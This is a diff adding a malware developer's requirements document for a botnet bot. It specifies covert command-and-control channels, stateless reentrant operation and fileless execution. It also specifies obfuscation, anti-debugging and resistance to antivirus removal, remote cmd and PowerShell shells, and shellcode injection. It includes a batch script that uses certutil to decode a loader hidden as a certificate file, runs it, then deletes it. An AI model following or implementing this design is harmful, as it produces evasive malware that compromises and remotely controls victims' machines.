@@ -1,0 +1,63 @@
+BOT REQUIREMENTS
+
+1. Communication channel and protocol
+- use of protocols open by default in corporate networks: HTTPS, DNS, ICMP
+- redundancy of communication channels
+- server verification (checking by digital signature or somehow making sure that this is not a control interception)
+- search for a command and control server in the event of a failure of all known addresses (desirable)
+- additional traffic encryption as protection against machine analysis
+- an easy-to-parse protocol. I mean, not json/xml/etc - why do we need complex parsers, if possible without them
+- extensible protocol. Ease of adding commands
+
+
+2. State (stateless bot)
+- you can not store things like configs, IDs on disk, neither in files, nor in the registry, anywhere
+That is, the bot must be "reentrant" - able to start from scratch, generate its id in a repeatable way,
+look around in the system and continue working, regardless of the previous state of yourself and the admin panel.
+- hence the requirement for the protocol - we minimize blocking requests, we provide a way to reset such requests.
+For example: if we gave a command to the bot, and at that moment the machine rebooted, then the admin panel will wait forever for a response.
+Conversely, if the bot is waiting for something from the server, and the connection is broken, there must be a way to get out of such a clinch.
+
+
+3. Fixing
+- it is desirable to duplicate the methods of fixing
+- it is desirable to use steganography for fixing.
+For example, we fix not the bot itself, but the following script:
+
+ @echo off
+ REM we get the bootloader from the "certificate"
+ certutil -decode file.crt file.exe
+ REM launch bootloader
+ file.exe
+ REM waiting for the file to load and process
+ ping -n 300 127.0.0.1 > NUL
+ REM remove the bootloader, because. he already managed to work out and start the load
+ del /f /yfile.exe
+
+That is, we use the standard OS utilities to unpack and launch the load, placing harmless scripts in plain sight.
+You can also use storage in a picture, a sound file, etc. - if only there was a way to deploy the load using only standard tools.
+- it is desirable to separate the bot into a loader and a load
+
+4. Protective measures
+Mandatory protection from at least machine analysis.
+- obfuscation of strings and system calls, modern automated methods
+- if you need to encrypt something, we use simple means - XOR gamma or XOR 1 byte.
+- no sandbox checks needed because it's hard to come up with good logic for that
+- you can do anti-debugging
+- use of removing hooks, injection protection, enabling mitigations, to make it difficult to debug and analyze the process
+- if it works, protection against removing the process (like how AB is done)
+- you can use LLVM obfuscator to build
+
+5. Functionality
+- only fileless techniques, for everything. Nothing is written to disk
+- the presence of cmd-shell (mandatory)
+- the presence of a powershell shell (desirable)
+- execution of arbitrary shell code https://github.com/DimopoulosElias/SimpleShellcodeInjector/blob/master/SimpleShellcodeInjector.c
+- executing an .exe file (preferably)
+- running .dll (rundll, regsvr) is desirable
+
+6. Separation of botnets
+- the bot must contain the botnet identifier, in case of multiple botnets working through one admin panel
+
+7. Auto update
+- the bot must provide auto-update
